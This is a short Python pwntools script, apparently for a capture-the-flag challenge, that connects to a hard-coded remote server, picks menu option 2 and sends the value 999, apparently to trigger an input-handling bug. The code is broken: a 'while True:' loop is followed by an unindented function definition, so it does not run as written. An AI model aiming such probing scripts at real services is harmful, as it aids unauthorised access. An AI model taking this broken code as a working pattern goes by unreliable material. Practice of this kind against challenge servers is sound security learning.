from pwn import *
global s
s = remote("138.68.67.161", 60004)


while True:
def work():
    print(s.recvuntil("> ").decode('utf-8'))
    s.sendline("2")
    print(s.recvuntil("> ").decode('utf-8'))
    s.sendline("999")

work()
print(s.recvuntil("> ").decode('utf-8'))
